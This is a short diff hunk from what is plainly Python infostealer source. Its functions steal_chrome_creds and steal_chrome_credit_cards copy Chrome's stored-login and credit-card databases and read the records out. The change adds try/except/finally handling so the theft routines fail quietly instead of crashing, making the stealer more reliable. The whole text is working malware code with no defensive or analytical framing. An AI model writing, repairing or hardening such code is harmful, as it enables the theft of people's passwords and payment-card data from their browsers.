@@ -96,16 +96,25 @@ def __get_chrome_credit_cards(cur):
 
 
 def steal_chrome_creds(): # get chrome credentials
-    __copy_db_file(__CHROME_CREDS_ORIGINAL_FILE, __CHROME_CREDS_COPY_FILE)
-    con, cur = __open_db_connection(__CHROME_CREDS_COPY_FILE)
-    chrome_creds = __get_chrome_creds(cur)
-    con.close() # Close SQLite3 connection
-    return chrome_creds
+    try:
+        __copy_db_file(__CHROME_CREDS_ORIGINAL_FILE, __CHROME_CREDS_COPY_FILE)
+        con, cur = __open_db_connection(__CHROME_CREDS_COPY_FILE)
+        chrome_creds = __get_chrome_creds(cur)
+        con.close() # Close SQLite3 connection
+    except:
+        chrome_creds = "Failed to steal chrome creds"
+    finally:
+        return chrome_creds
 
 
 def steal_chrome_credit_cards(): # get chrome credit cards
-    __copy_db_file(__CHROME_CREDIT_CARDS_FILE, __CHROME_CREDIT_CARDS_COPY_FILE)
-    con, cur = __open_db_connection(__CHROME_CREDIT_CARDS_COPY_FILE)
-    credit_cards = __get_chrome_credit_cards(cur)
-    con.close() # Close SQLite3 connection
-    return credit_cards
+    try:
+        __copy_db_file(__CHROME_CREDIT_CARDS_FILE, __CHROME_CREDIT_CARDS_COPY_FILE)
+        con, cur = __open_db_connection(__CHROME_CREDIT_CARDS_COPY_FILE)
+        credit_cards = __get_chrome_credit_cards(cur)
+        con.close() # Close SQLite3 connection
+        return credit_cards
+    except:
+        credit_cards = "Failed to steal chrome credit cards"
+    finally:
+        return credit_cards
